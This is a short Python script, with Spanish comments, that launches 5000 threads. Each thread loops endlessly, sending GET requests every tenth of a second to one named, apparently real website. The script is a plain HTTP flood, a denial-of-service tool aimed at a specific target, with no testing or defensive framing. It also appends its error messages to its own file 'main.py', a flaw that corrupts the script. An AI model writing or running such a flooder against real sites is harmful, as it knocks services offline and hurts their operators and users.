import threading
import time
import urllib3

def make_request():
    url = 'https://q.plataformaintegra.net/victorfelix/'
    
    while True:
        try:
            http = urllib3.PoolManager(num_pools=5000, maxsize=50000)
            response = http.request('GET', url)
            
            if response.status == 200:
                print("Petición exitosa")
            else:
                with open('main.py', 'a') as f:
                    f.write('Error en la petición con código de estado: {}\n'.format(response.status))
                print(f'Error en la petición con código de estado: {response.status}')
            
            time.sleep(0.1)
        except urllib3.exceptions.HTTPError as e:  # Corregir la referencia a HTTPError
            print(f'Error en la petición: {e}')
            time.sleep(1)

threads = []
for i in range(5000):
    t = threading.Thread(target=make_request)  # Corregir la llamada a Thread
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()
